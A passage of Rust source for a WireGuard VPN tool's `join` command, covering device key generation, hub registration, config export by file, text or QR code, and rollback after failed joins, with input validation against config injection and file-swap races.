//! `anago join <domain> <code>` (DESIGN.md §6.2).
//!
//! The device makes its own keypair, hands the hub the public half, and
//! keeps what comes back. The private key never leaves — it goes
//! straight into the WireGuard config, and not into `device.json`
//! (§9.2).
//!
//! Everything that can be decided without a network is a pure function
//! here: the request body, the device file, the fallback name, and what
//! to say about each way the hub can refuse.

use std::fmt;
use std::io::Write;
use std::path::{Path, PathBuf};

use anago_core::code::JoinCode;
use anago_core::json::{self, Value};
use anago_core::name::DeviceName;
use anago_core::proto::{self, ErrorCode, JoinRequest, JoinResponse, PATH_JOIN};
use anago_core::state::PrivateKey;
use anago_core::subnet::Subnet;
use anago_core::token::DeviceToken;
use anago_core::wgconf::{self, ClientProfile};

use crate::client::{self, Method, Request};
use crate::diagnostics::Target;
use crate::fsutil;
use crate::paths::{ClientPaths, InvokingUser};
use crate::wg::{self, WgError};

/// Schema version of `device.json`.
pub const SCHEMA_VERSION: i64 = 1;

/// What to say about a device file from before `api_port` was stored.
///
/// Only the repair that works: a re-join would be turned away by
/// `check_not_joined` while this file and the wg config are still
/// there, and the hub would refuse the name it already has registered.
const MISSING_PORT: &str = "no api_port — this file was written by an earlier build that did \
     not record which port it joined on. Add \"api_port\": <port> to this file: the port the \
     hub serves its API on, which is 443 unless `server init --api-port` said otherwise";

/// What a joined device keeps (§9.2).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DeviceConfig {
    pub domain: String,
    /// The control-API port this device reached the hub on — `ls` and
    /// `rm` have to use the same one, and it is not always 443 (§9.2).
    pub api_port: u16,
    pub name: String,
    pub address: String,
    pub subnet: String,
    /// Bearer token for `ls` and `rm`. The file is 0600 because of it.
    pub token: String,
    pub server_public_key: String,
    pub server_endpoint: String,
    pub server_address: String,
}

impl DeviceConfig {
    /// Built from the hub's answer plus the domain the person typed.
    pub fn from_response(domain: &str, api_port: u16, response: JoinResponse) -> DeviceConfig {
        DeviceConfig {
            domain: domain.to_string(),
            api_port,
            name: response.name,
            address: response.address,
            subnet: response.subnet,
            token: response.token,
            server_public_key: response.server_public_key,
            server_endpoint: response.server_endpoint,
            server_address: response.server_address,
        }
    }

    pub fn to_json(&self) -> Value {
        Value::obj([
            ("version", Value::Int(SCHEMA_VERSION)),
            ("domain", Value::str(self.domain.as_str())),
            ("api_port", Value::Int(i64::from(self.api_port))),
            ("name", Value::str(self.name.as_str())),
            ("address", Value::str(self.address.as_str())),
            ("subnet", Value::str(self.subnet.as_str())),
            ("token", Value::str(self.token.as_str())),
            (
                "server_public_key",
                Value::str(self.server_public_key.as_str()),
            ),
            ("server_endpoint", Value::str(self.server_endpoint.as_str())),
            ("server_address", Value::str(self.server_address.as_str())),
        ])
    }

    pub fn to_json_string(&self) -> String {
        json::to_string_pretty(&self.to_json())
    }

    /// Reads a device file back — `ls` and `rm` both start here.
    pub fn parse(text: &str) -> Result<DeviceConfig, JoinError> {
        let value = json::parse(text).map_err(|e| JoinError::DeviceFile(e.to_string()))?;
        let obj = proto::object(&value).map_err(|e| JoinError::DeviceFile(e.to_string()))?;
        let version = obj
            .get("version")
            .and_then(Value::as_i64)
            .ok_or_else(|| JoinError::DeviceFile("no version".to_string()))?;
        if version != SCHEMA_VERSION {
            return Err(JoinError::DeviceFile(format!(
                "device file is version {version}, this build writes {SCHEMA_VERSION}"
            )));
        }
        let field = |name: &str| -> Result<String, JoinError> {
            proto::string_field(obj, name).map_err(|e| JoinError::DeviceFile(e.to_string()))
        };
        // Absent is "unknown", and stays unknown: an earlier build
        // took `--api-port` without recording it, so a file missing
        // this field may belong to a hub on any port. Calling 443 anyway
        // would fail in a way that looks like the hub being down, so
        // the read fails instead and says how to repair the file
        // (§9.2).
        let api_port = obj
            .get("api_port")
            .ok_or_else(|| JoinError::DeviceFile(MISSING_PORT.to_string()))?
            .as_i64()
            .and_then(|port| u16::try_from(port).ok())
            .filter(|port| *port > 0)
            .ok_or_else(|| JoinError::DeviceFile("api_port is not a port".to_string()))?;
        Ok(DeviceConfig {
            domain: field("domain")?,
            api_port,
            name: field("name")?,
            address: field("address")?,
            subnet: field("subnet")?,
            token: field("token")?,
            server_public_key: field("server_public_key")?,
            server_endpoint: field("server_endpoint")?,
            server_address: field("server_address")?,
        })
    }

    /// The wg config this device should run, built from what the hub
    /// said plus the key that never left.
    /// Every field is parsed, not copied. These strings land in a
    /// root-owned config file, and `PublicKey =` or `Endpoint =` with a
    /// newline in it would let a hub write its own `PostUp` line — a
    /// TLS-authenticated hub is still not a trusted compiler.
    pub fn profile(&self, private_key: PrivateKey) -> Result<ClientProfile, JoinError> {
        Ok(ClientProfile {
            address: self.address.parse().map_err(|_| {
                JoinError::BadResponse(format!("{:?} is not an address", self.address))
            })?,
            subnet: Subnet::parse(&self.subnet)
                .map_err(|e| JoinError::BadResponse(format!("subnet: {e}")))?,
            private_key,
            server_public_key: wg::parse_key(&self.server_public_key)
                .map_err(|e| JoinError::BadResponse(format!("server public key: {e}")))?,
            server_endpoint: checked_endpoint(&self.server_endpoint)?,
        })
    }

    /// The port `ls` and `rm` call the hub on.
    pub fn api_port(&self) -> u16 {
        self.api_port
    }

    /// The hub's private address, parsed. `None` only for a file that
    /// was hand-edited after [`DeviceConfig::validate`] accepted it.
    pub fn server_ip(&self) -> Option<std::net::Ipv4Addr> {
        self.server_address.parse().ok()
    }

    /// Checks the fields that never reach the wg config but do reach
    /// later commands.
    pub fn validate(&self) -> Result<(), JoinError> {
        DeviceName::parse(&self.name).map_err(|e| JoinError::BadResponse(format!("name: {e}")))?;
        DeviceToken::parse(&self.token)
            .map_err(|e| JoinError::BadResponse(format!("token: {e}")))?;
        self.server_address
            .parse::<std::net::Ipv4Addr>()
            .map_err(|_| {
                JoinError::BadResponse(format!(
                    "{:?} is not the server's address",
                    self.server_address
                ))
            })?;
        Ok(())
    }
}

/// Parses `host:port` strictly and gives it back canonical.
///
/// Anything a wg config would read as another directive — a newline, a
/// space, a stray `=` — fails here rather than in a file running as
/// root.
pub fn checked_endpoint(text: &str) -> Result<String, JoinError> {
    let bad = |why: &str| JoinError::BadResponse(format!("server endpoint {text:?}: {why}"));
    let (host, port) = text
        .rsplit_once(':')
        .ok_or_else(|| bad("expected host:port"))?;
    if host.is_empty() {
        return Err(bad("no host"));
    }
    if !host
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.')
    {
        return Err(bad("the host is not a hostname"));
    }
    let port: u16 = port.parse().map_err(|_| bad("the port is not a number"))?;
    if port == 0 {
        return Err(bad("port 0 is not a port"));
    }
    Ok(format!("{host}:{port}"))
}

/// The body of `POST /api/v1/join`.
pub fn request_body(code: &JoinCode, name: &DeviceName, public_key: &str) -> String {
    json::to_string(
        &JoinRequest {
            code: code.to_string(),
            name: name.to_string(),
            public_key: public_key.to_string(),
        }
        .to_json(),
    )
}

/// Turns a hostname into a device name.
///
/// `MacBook-Pro.local` becomes `macbook-pro`: the first label only,
/// lower-cased, with anything the rules reject replaced by `-`. A name
/// that survives none of that is `None`, and `join` asks for `--name`
/// rather than inventing one.
pub fn name_from_hostname(hostname: &str) -> Option<DeviceName> {
    let label = hostname.split('.').next().unwrap_or_default();
    let cleaned: String = label
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let trimmed = cleaned.trim_matches(|c: char| c == '-' || c == '_');
    DeviceName::parse(trimmed).ok()
}

/// This machine's hostname.
#[cfg(unix)]
pub fn hostname() -> Option<String> {
    let mut buffer = [0u8; 256];
    // SAFETY: the buffer is valid for `len` bytes and gethostname
    // writes at most that many, NUL-terminating when it fits.
    let result = unsafe { libc::gethostname(buffer.as_mut_ptr().cast(), buffer.len() - 1) };
    if result != 0 {
        return None;
    }
    let end = buffer.iter().position(|byte| *byte == 0).unwrap_or(0);
    String::from_utf8(buffer[..end].to_vec()).ok()
}

/// This machine's hostname — Windows keeps it in the environment.
#[cfg(windows)]
pub fn hostname() -> Option<String> {
    std::env::var("COMPUTERNAME").ok().filter(|name| !name.is_empty())
}

/// What to tell the person when the hub refuses a join.
///
/// The reading is shared with the other commands ([`client::describe`]);
/// only the advice below is about joining.
pub fn explain(status: u16, body: &str) -> String {
    let failure = client::describe(status, body);
    let advice = match failure.code {
        Some(ErrorCode::InvalidCode) => {
            " — codes are single use and expire; run `anago code` on the server for another"
        }
        Some(ErrorCode::NameTaken) => " — pick another with --name, or `anago rm` the old device",
        Some(ErrorCode::InvalidName) => {
            " — see the name rules in the docs (letters, digits, - and _)"
        }
        Some(ErrorCode::SubnetFull) => " — every address is taken; remove a device first",
        Some(ErrorCode::InvalidPublicKey) => {
            " — this looks like a bug in anago, not something you did"
        }
        _ => "",
    };
    format!("the hub refused the join: {}{advice}", failure.message)
}

/// What a successful join produced.
///
/// The private key is deliberately not in here: it went into the
/// WireGuard config and there is no reason for another copy to travel
/// back up the call stack.
#[derive(Debug)]
pub struct Joined {
    pub config: DeviceConfig,
}

/// Registers this device with the hub.
///
/// **Human verification needed**: runs `wg genkey`, talks to a real
/// hub, and writes under `/etc/wireguard`.
pub fn run(
    domain: &str,
    code: &JoinCode,
    name: Option<DeviceName>,
    api_port: u16,
    client_paths: &ClientPaths,
    wg_config_path: &Path,
    invoking: Option<&InvokingUser>,
) -> Result<Joined, JoinError> {
    // Everything that can refuse happens before the code is spent: a
    // join that fails after registering leaves the person holding a
    // used code and no tunnel.
    wg::check_tools_from_env().map_err(JoinError::Wg)?;
    let name = match name {
        Some(name) => name,
        None => hostname()
            .as_deref()
            .and_then(name_from_hostname)
            .ok_or(JoinError::NoName)?,
    };
    let client_dir = prepare_client_dir(client_paths, invoking)?;
    // Declared before the reservation so it outlives it: the claim is
    // released while this is still held, and only a lock holder ever
    // reclaims a leftover marker.
    let _lock = acquire_join_lock(&client_dir, invoking)?;
    check_not_joined(&client_dir, client_paths, wg_config_path)?;
    if let Some(parent) = wg_config_path.parent() {
        fsutil::ensure_private_dir(parent).map_err(|e| JoinError::Save {
            what: "the WireGuard directory",
            target: Target::system_directory(parent),
            kind: e.kind(),
            source: e.to_string(),
        })?;
    }

    // Both files are claimed — empty, 0600, exclusively created —
    // before the hub is asked for anything. Permission problems and
    // races surface here, while the code is still unspent; the writes
    // afterwards go into files this process already owns. The
    // reservation deletes itself unless the join finishes.
    let owner = invoking.map(|user| (user.uid, user.gid));
    let mut reservation = Reservation::claim(&client_dir, client_paths, wg_config_path, owner)?;

    let (private_key, public_key) = wg::generate_keypair().map_err(JoinError::Wg)?;
    let body = request_body(code, &name, &public_key);
    let response = client::send(&Request {
        method: Method::Post,
        host: domain,
        port: api_port,
        path: PATH_JOIN,
        body: Some(client::Body::json(&body)),
        authorization: None,
    })
    .map_err(JoinError::Client)?;

    if !response.is_success() {
        // Nothing was registered, so nothing needs undoing.
        return Err(JoinError::Refused(explain(response.status, &response.body)));
    }

    // The hub has now spent the code and registered a peer. Every
    // failure below is a failure *after* that, so they all leave
    // through the same door — one that tries to undo the registration
    // and, failing that, says what to do by hand.
    let destination = Destination {
        client_dir: &client_dir,
        client_paths,
        wg_config: wg_config_path,
        owner,
    };
    match finish(&response.body, domain, api_port, private_key, &destination) {
        Ok(config) => {
            reservation.commit();
            Ok(Joined { config })
        }
        Err(e) => Err(post_registration(
            &response.body,
            domain,
            api_port,
            NOTHING_SAVED,
            &e,
        )),
    }
}

/// What `--export conf` registered, and where its config went.
///
/// No token. §8 throws the one the hub sent away: the official
/// WireGuard app never calls anago's control API, so a token that
/// reached the phone would be a credential with nothing to use it on.
/// The consequence is that the phone cannot `ls`, `rm` or `sync` itself
/// — it is removed from the hub with `anago rm <name>` (§8).
#[derive(Debug)]
pub struct Exported {
    pub config: DeviceConfig,
    /// Which way the config left, so the note that follows can say the
    /// right thing about where it is now.
    pub handed: Handed,
}

/// Which way a config left this machine.
///
/// The same three shapes as [`Handover`], minus what only the run
/// needed. They are apart because what a person has to do next differs
/// in each: a file to delete, a scrollback to clear, or a picture on a
/// screen.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Handed {
    Text,
    File(PathBuf),
    Qr,
}

/// Registers a **phone** and hands over its config (§8, §7.3).
///
/// **Nothing local happens.** No wg config, no `device.json`, no join
/// lock, and so none of §6.2's already-joined refusal either — this
/// machine is not the one joining. That is a property of the signature
/// rather than a rule to remember: there is no `ClientPaths` and no wg
/// path here to write to. Duplicate names are still refused, by the
/// hub (§8.1).
///
/// It needs no root for the same reason. The one thing it shares with a
/// local join is `wg genkey`/`wg pubkey`.
///
/// **The order is the same as a local join's, for the same reason.**
/// Everything that can refuse happens before the code is spent: the
/// tools, and the `--out` file, which is created empty and exclusively
/// (§7.3 — anago never writes over a file that is already there). A
/// file already at that name is then an error somebody can fix without
/// burning a single-use code.
///
/// And every failure *after* the hub answers goes out through the same
/// door a local join uses: [`post_registration`] undoes the
/// registration, so a phone that never received its config is not left
/// occupying a name and an address on the hub.
///
/// **Human verification needed**: runs `wg genkey` and talks to a real
/// hub.
/// Where an export puts the config it renders.
///
/// The rendered text never comes back to the caller. A [`SecretText`]
/// travelling up the call stack would only widen the set of places a
/// private key can be printed from by accident (§7.3), so the thing
/// that will consume it is handed *in*.
pub enum Handover<'a> {
    /// `--export conf` with no `--out`: the config text, on stdout.
    Text,
    /// `--export conf --out <p>`: the config text, in a file at 0600.
    File(&'a Path),
    /// `--export qr`: drawn on the terminal, in `columns` of it. Never
    /// a file — anago writes no image files (§10.2), and a QR is only
    /// ever looked at.
    Qr { columns: usize },
}

impl Handover<'_> {
    /// The file this will take before the code is spent, if any.
    fn claims(&self) -> Option<&Path> {
        match self {
            Handover::File(path) => Some(path),
            Handover::Text | Handover::Qr { .. } => None,
        }
    }

    fn handed(&self) -> Handed {
        match self {
            Handover::Text => Handed::Text,
            Handover::File(path) => Handed::File(path.to_path_buf()),
            Handover::Qr { .. } => Handed::Qr,
        }
    }
}

pub fn export_conf(
    domain: &str,
    code: &JoinCode,
    name: &DeviceName,
    api_port: u16,
    to: Handover<'_>,
) -> Result<Exported, JoinError> {
    // `wg` alone: this makes a keypair and brings no interface up, so
    // asking for `wg-quick` would refuse a machine that can do all of
    // it, in a sentence about a program it never runs.
    wg::check_keygen_from_env().map_err(JoinError::Wg)?;
    // Still before the code is spent: a window that could not hold the
    // smallest QR there is cannot hold whatever the hub answers with
    // either. The exact size needs the answer, so the rest of that
    // check waits — but this half costs nothing and saves a code.
    if let Handover::Qr { columns } = to {
        let floor = anago_core::qr::columns(anago_core::qr::SMALLEST, anago_core::qr::Blocks::Half);
        if columns < floor {
            return Err(JoinError::TooNarrow {
                needed: floor,
                available: columns,
            });
        }
    }
    let mut claimed = match to.claims() {
        Some(path) => Some(Claimed::take(path)?),
        None => None,
    };

    let (private_key, public_key) = wg::generate_keypair().map_err(JoinError::Wg)?;
    let body = request_body(code, name, &public_key);
    let response = client::send(&Request {
        method: Method::Post,
        host: domain,
        port: api_port,
        path: PATH_JOIN,
        body: Some(client::Body::json(&body)),
        authorization: None,
    })
    .map_err(JoinError::Client)?;

    if !response.is_success() {
        // Nothing was registered, so nothing needs undoing — and the
        // claimed file goes away with the guard.
        return Err(JoinError::Refused(explain(response.status, &response.body)));
    }

    match hand_over(
        &response.body,
        domain,
        api_port,
        private_key,
        &to,
        claimed.as_mut(),
    ) {
        Ok(config) => {
            if let Some(claimed) = claimed.as_mut() {
                claimed.keep();
            }
            Ok(Exported {
                config,
                handed: to.handed(),
            })
        }
        Err(e) => Err(post_registration(
            &response.body,
            domain,
            api_port,
            NOTHING_HANDED_OVER,
            &e,
        )),
    }
}

/// Renders the phone's config and hands it over — the export's half of
/// [`finish`].
///
/// The rendered text goes straight from here to its destination and is
/// never returned. A [`SecretText`] that travelled back up the call
/// stack would only widen the set of places a private key can be
/// printed from by accident (§7.3).
fn hand_over(
    body: &str,
    domain: &str,
    api_port: u16,
    private_key: PrivateKey,
    to: &Handover<'_>,
    claimed: Option<&mut Claimed>,
) -> Result<DeviceConfig, JoinError> {
    let (config, profile) = accepted(body, domain, api_port, private_key)?;
    let text = wgconf::export_profile(&profile);
    match to {
        Handover::File(_) => match claimed {
            Some(claimed) => claimed.fill(&text)?,
            // Only reachable if `claims` and this ever disagreed about
            // which endings take a file.
            None => return Err(JoinError::Unsent("no file was claimed".to_string())),
        },
        Handover::Text => to_stdout(text.expose())?,
        Handover::Qr { columns } => {
            let drawn = drawn_code(&text, *columns)?;
            to_stdout(&drawn)?;
        }
    }
    Ok(config)
}

/// The config as a QR code, ready to print.
///
/// The encoder is the binary's (§10.2); everything from the module grid
/// on is [`anago_core::qr`], where it is unit-tested. A window too
/// narrow is an error rather than a smaller code: a QR wider than the
/// terminal wraps, and a wrapped one still looks like a QR.
fn drawn_code(text: &wgconf::SecretText, columns: usize) -> Result<String, JoinError> {
    let modules = crate::qrcode::encode(text).ok_or_else(|| {
        // A wg config is a few hundred bytes and the largest version
        // holds thousands, so this is unreachable short of a hub
        // answering with something enormous.
        JoinError::BadResponse("the config is too long to put in a QR code".to_string())
    })?;
    match anago_core::qr::draw(&modules, columns) {
        anago_core::qr::Drawing::Code(text) => Ok(text),
        anago_core::qr::Drawing::TooNarrow { needed, available } => {
            Err(JoinError::TooNarrow { needed, available })
        }
    }
}

/// Writes the body out, and turns a closed pipe into an error the undo
/// path understands.
fn to_stdout(text: &str) -> Result<(), JoinError> {
    let mut stdout = std::io::stdout().lock();
    stdout
        .write_all(text.as_bytes())
        .and_then(|()| stdout.flush())
        .map_err(|e| JoinError::Unsent(e.to_string()))
}

/// A `--out` file, created before the join and deleted unless it is
/// filled.
///
/// The descriptor is held from the create to the write, so what gets
/// written is the file this run made — not whatever has since arrived
/// at that name. A `--out` is a path a person typed, in a directory
/// anago knows nothing about and may not own (§13): `/tmp` is the
/// ordinary case, and anybody can rename a file out of `/tmp` and put
/// their own there.
///
/// **Holding the descriptor is not enough on its own.** It settles
/// which file gets written; it says nothing about which file has that
/// *name* by the time the hub has answered. Both endings need the
/// answer, and they need it for opposite reasons:
///
/// - Success would otherwise report a path that no longer holds the
///   config — "written to phone.conf" about somebody else's file.
/// - Cleanup would otherwise `remove_file` whatever is at the name
///   now, which is the one thing §7.3 promises never happens: anago
///   does not delete a file it did not create.
///
/// So both ask [`Claimed::is_ours`] first, and neither touches the name
/// when the answer is no.
#[derive(Debug)]
struct Claimed {
    path: PathBuf,
    file: std::fs::File,
    kept: bool,
}

impl Claimed {
    fn take(path: &Path) -> Result<Claimed, JoinError> {
        let file = fsutil::open_new_private(path).map_err(|e| JoinError::Save {
            what: "the config file",
            target: Target::user_file(path),
            kind: e.kind(),
            source: e.to_string(),
        })?;
        Ok(Claimed {
            path: path.to_path_buf(),
            file,
            kept: false,
        })
    }

    fn fill(&mut self, text: &wgconf::SecretText) -> Result<(), JoinError> {
        self.file
            .write_all(text.expose().as_bytes())
            .and_then(|()| self.file.sync_all())
            .map_err(|e| JoinError::Save {
                what: "the config file",
                target: Target::user_file(&self.path),
                kind: e.kind(),
                source: e.to_string(),
            })?;
        // Asked after the write, because it is the write that has to
        // have landed somewhere reachable. The config is in the file
        // this run created either way; the question is whether anyone
        // can still find it by the name they gave.
        if !self.is_ours() {
            return Err(JoinError::Taken(self.path.clone()));
        }
        Ok(())
    }

    /// Whether `path` still names the file this run created.
    ///
    /// `fstat` on the held descriptor against `lstat` on the name:
    /// same device, same inode. `lstat` rather than `stat`, so a
    /// symlink dropped at the name is a mismatch rather than a
    /// follow-through to whatever it points at.
    ///
    /// Anything unreadable is a "no". The two callers both want the
    /// careful answer — one would report a path it cannot vouch for,
    /// the other would delete something.
    ///
    /// It cannot make the check atomic with what follows it: POSIX has
    /// no unlink-this-descriptor. What it does is shrink the window
    /// from the whole network call, which is seconds long and easy to
    /// win, to the gap between two syscalls.
    #[cfg(unix)]
    fn is_ours(&self) -> bool {
        #[cfg(unix)]
        use std::os::unix::fs::MetadataExt;

        let (Ok(held), Ok(named)) = (self.file.metadata(), std::fs::symlink_metadata(&self.path))
        else {
            return false;
        };
        held.dev() == named.dev() && held.ino() == named.ino()
    }

    /// Windows: the identity check guards a *root* process against the
    /// directory's owner swapping the file mid-rollback. There is no
    /// sudo here and the directory is the user's own, so "a plain file
    /// still sits at the name" is the whole question.
    #[cfg(windows)]
    fn is_ours(&self) -> bool {
        std::fs::symlink_metadata(&self.path)
            .map(|m| m.is_file())
            .unwrap_or(false)
    }

    fn keep(&mut self) {
        self.kept = true;
    }
}

impl Drop for Claimed {
    fn drop(&mut self) {
        if self.kept {
            return;
        }
        // Only ever the file this run created: `open_new_private`
        // refused to open an existing one, and this refuses to delete
        // a name that has stopped meaning it. What was written into
        // the orphaned inode goes away when the descriptor closes —
        // unless somebody renamed it somewhere, and a name nobody here
        // knows is not one to go deleting.
        if self.is_ours() {
            let _ = std::fs::remove_file(&self.path);
        }
    }
}

/// What to say once a phone's config has left this machine (§7.3).
///
/// Always, and without looking at where standard output goes. Whether
/// it is a terminal or a pipe changes what a person should do about it,
/// but detecting that would mean two behaviours to reason about and one
/// of them wrong whenever the guess missed. The same sentence every
/// time is the one that can be relied on.
pub fn export_note(name: &DeviceName, handed: &Handed) -> String {
    // A QR is not plain text on the screen, and calling it that would
    // let somebody think the picture is safer than the words. It is the
    // same key; anything that can read the code has it.
    let mut note = String::from(match handed {
        Handed::Qr => {
            "This code carries the phone's private key. Anything that can\nread it has the key.\n\n"
        }
        Handed::Text | Handed::File(_) => "This is the phone's private key, in plain text.\n\n",
    });
    match handed {
        Handed::File(path) => note.push_str(&indented(&[
            &format!(
                "It is in {} (0600). Move it to the phone, then",
                path.display()
            ),
            &format!(
                "delete it: `rm {}`. Backups and cloud-synced",
                path.display()
            ),
            "folders are the real risk — a .conf left in",
            "~/Documents copies itself somewhere quietly.",
        ])),
        Handed::Text => note.push_str(&indented(&[
            "Move it to the phone, then take it off the screen and out",
            "of the record. Both: neither on its own is enough.",
            "",
            "`clear` (or Ctrl-L) takes it off the screen — and puts it",
            "in the scrollback. So clear that next, with your terminal's",
            "own command: Clear Scrollback in its menu, or",
            "`clear-history` under tmux. In that order nothing is left;",
            "clearing the record first only files the screen away after",
            "it. Some terminals keep scrollback on disk, and over SSH",
            "it is at both ends.",
            "",
            "For a file, use --out rather than `>`: a shell redirect",
            "takes its mode from your umask, which is usually 0644.",
            "anago's own file is 0600, and never replaces one that",
            "is already there.",
        ])),
        // The same key, as a picture. `--out` is not the advice here:
        // `--export qr` takes none, because anago writes no image
        // files (§10.2).
        Handed::Qr => note.push_str(&indented(&[
            "Scan it, then take it off the screen and out of the",
            "record. Both: neither on its own is enough.",
            "",
            "`clear` (or Ctrl-L) takes it off the screen — and puts it",
            "in the scrollback. So clear that next, with your terminal's",
            "own command: Clear Scrollback in its menu, or",
            "`clear-history` under tmux, which empties the record and",
            "leaves what is on the pane exactly where it is. In that",
            "order nothing is left.",
            "",
            "A photograph of the screen keeps it too, and a QR is the",
            "shape people photograph.",
            "",
            "For a file instead, `--export conf --out <path>` writes",
            "one at 0600.",
        ])),
    }
    note.push('\n');
    // What the phone cannot do is remove *itself*: §8 throws its token
    // away, so it has no way to call the API. Removing it is ordinary
    // — `anago rm` on the hub, or on any device that did keep a
    // token, since the API authenticates the caller and not the
    // subject. Naming only the hub would send somebody to the server
    // for something they could do from the laptop in front of them.
    note.push_str(&indented(&[
        &format!("The hub knows this phone as {name}, like any other device."),
        "What it cannot do is remove itself — it has no anago and no",
        &format!("token — so somebody else does: `anago rm {name}` on the"),
        "hub, or on any device that has joined.",
    ]));
    // A code that is too wide is refused before it is drawn
    // (`JoinError::TooNarrow`). A code that is drawn and still will not
    // scan has no error to report: the terminal's font decides whether
    // the half-height blocks meet, and anago cannot see the screen. So
    // the way out is said here, beside the code, while the person is
    // still looking at it — and it is the removal above, because the
    // key is only on this screen and there is no re-drawing it.
    if matches!(handed, Handed::Qr) {
        note.push('\n');
        note.push_str(&indented(&[
            "If the phone will not read it, that is the way out too:",
            "some fonts draw the half-height blocks with a seam, and a",
            "code nothing can scan cannot be re-sent — the key is only",
            &format!("on this screen. `anago rm {name}`, a fresh `anago code`,"),
            "then `--export conf` hands the same config over as text.",
        ]));
    }
    note
}

/// Lays a block of detail out under a heading, the way every other note
/// here does.
///
/// Built line by line rather than as one literal with continuations:
/// the indentation is part of what this prints, and a literal that
/// carries it in backslash-continued source is one a reformat can
/// quietly rewrite.
fn indented(lines: &[&str]) -> String {
    lines
        .iter()
        .map(|line| {
            if line.is_empty() {
                // No trailing spaces on a blank line.
                "\n".to_string()
            } else {
                format!("     {line}\n")
            }
        })
        .collect()
}

/// Where a finished join writes, and on whose behalf.
struct Destination<'a> {
    client_dir: &'a fsutil::DirHandle,
    client_paths: &'a ClientPaths,
    wg_config: &'a Path,
    owner: Owner,
}

/// Everything between a 2xx and a usable device: decode, validate,
/// write.
fn finish(
    body: &str,
    domain: &str,
    api_port: u16,
    private_key: PrivateKey,
    to: &Destination,
) -> Result<DeviceConfig, JoinError> {
    let (config, profile) = accepted(body, domain, api_port, private_key)?;
    publish(&config, &profile, to)?;
    Ok(config)
}

/// The hub's answer, decoded and checked, with this device's key in it.
///
/// One place for it, because both endings need exactly the same thing
/// first: nothing from the hub reaches a config file — root-owned here,
/// a phone's there — unparsed.
fn accepted(
    body: &str,
    domain: &str,
    api_port: u16,
    private_key: PrivateKey,
) -> Result<(DeviceConfig, ClientProfile), JoinError> {
    let value = json::parse(body).map_err(|e| JoinError::BadResponse(e.to_string()))?;
    let answer =
        JoinResponse::from_json(&value).map_err(|e| JoinError::BadResponse(e.to_string()))?;

    let config = DeviceConfig::from_response(domain, api_port, answer);
    config.validate()?;
    let profile = config.profile(private_key)?;
    Ok((config, profile))
}

/// What a failed local join leaves undone.
const NOTHING_SAVED: &str = "nothing could be saved on this machine";

/// What a failed export leaves undone. Deliberately not the same
/// sentence: that path writes no local files at all (§8), so "nothing
/// could be saved" would send somebody looking on this machine for a
/// file that was never going to be here.
const NOTHING_HANDED_OVER: &str = "the config never reached the phone";

/// Turns a failure that happened after registration into an error that
/// says what state the hub is in.
///
/// `what` is the half of that sentence only the caller knows — the two
/// paths leave different things undone, and one wording for both would
/// be wrong for whichever it was not written for.
///
/// The credentials for undoing are read from the raw body, not from the
/// decoded config — the point is to still clean up when it was a *later*
/// field that was unreadable.
fn post_registration(
    body: &str,
    domain: &str,
    api_port: u16,
    what: &'static str,
    cause: &JoinError,
) -> JoinError {
    let outcome = match undo_credentials(body) {
        Some((name, token)) => {
            if undo_registration(domain, api_port, &name, &token).is_ok() {
                Undo::Done
            } else {
                Undo::Failed(name.to_string())
            }
        }
        // Not even the name and token were readable, so there is
        // nothing to delete with.
        None => Undo::Unknown,
    };
    JoinError::SavedNothing {
        what,
        source: cause.to_string(),
        recovery: recovery_note(outcome),
    }
}

/// Pulls just the two fields an undo needs out of a response body.
///
/// Deliberately not `JoinResponse::from_json`: a body with a good name
/// and token but a malformed endpoint still has everything required to
/// clean up after itself.
pub fn undo_credentials(body: &str) -> Option<(DeviceName, DeviceToken)> {
    let value = json::parse(body).ok()?;
    let name = DeviceName::parse(value.get("name")?.as_str()?).ok()?;
    let token = DeviceToken::parse(value.get("token")?.as_str()?).ok()?;
    Some((name, token))
}

/// How an attempted undo went.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Undo {
    /// The hub was told to forget the device.
    Done,
    /// The hub kept it; the person has to remove it by name.
    Failed(String),
    /// The answer was unreadable enough that even the name is unknown.
    Unknown,
}

/// What to do after a join that registered but could not be saved.
pub fn recovery_note(outcome: Undo) -> String {
    match outcome {
        Undo::Done => "the hub has been told to forget this device, so the same command can be \
             run again once the problem is fixed (the join code, though, is spent — get \
             another with `anago code`)"
            .to_string(),
        Undo::Failed(name) => format!(
            "the hub still lists {name} — remove it there with `anago rm {name}` before \
             retrying, and get a fresh code with `anago code`"
        ),
        Undo::Unknown => "the hub may have registered this device under a name this build \
             could not read — check `anago ls` on the server and `anago rm` it before \
             retrying, with a fresh code from `anago code`"
            .to_string(),
    }
}

/// What a claimed-but-unfinished file contains.
///
/// A marker rather than an empty file, and a comment rather than
/// anything else, so it reads as harmless in the one place it might be
/// seen — `/etc/wireguard/anago.conf`.
pub const CLAIM_MARKER: &str = "# anago: unfinished join — safe to delete\n";

/// Whether a file is a leftover claim rather than a real config.
///
/// `Drop` cleans up when the process gets to run; a Ctrl-C or a kill
/// during the network call does not. Without this, the next `anago
/// join` would find the two files and refuse as if the device had
/// already joined — with nothing to join *to*.
pub fn is_stale_claim(contents: &str) -> bool {
    // The marker and nothing else. An empty file might be one a person
    // made on purpose — `touch /etc/wireguard/anago.conf` to hold the
    // name — and no released build ever left an empty claim, so there
    // is nothing to stay compatible with.
    contents == CLAIM_MARKER
}

/// Files claimed for this attempt, released if it does not finish.
///
/// Claiming up front turns "the disk is full after the code was spent"
/// into "the disk is full before anything happened", which is a retry
/// rather than a dead end.
///
/// The wg config is claimed by path — `/etc/wireguard` is root's
/// already. The device file is claimed through the directory
/// descriptor, so nothing about it can be redirected by renaming a
/// directory the person owns.
#[derive(Debug)]
struct Reservation<'a> {
    wg_config: &'a Path,
    client_dir: &'a fsutil::DirHandle,
    device_file: String,
    /// Whether this attempt actually took the device file. A claim that
    /// failed because somebody else holds that name must not have its
    /// cleanup delete their file.
    device_claimed: bool,
    committed: bool,
}

/// Who a newly created client-side file should belong to.
type Owner = Option<(u32, u32)>;

impl<'a> Reservation<'a> {
    fn claim(
        client_dir: &'a fsutil::DirHandle,
        client_paths: &ClientPaths,
        wg_config: &'a Path,
        owner: Owner,
    ) -> Result<Reservation<'a>, JoinError> {
        claim_system(wg_config)?;
        let mut reservation = Reservation {
            wg_config,
            client_dir,
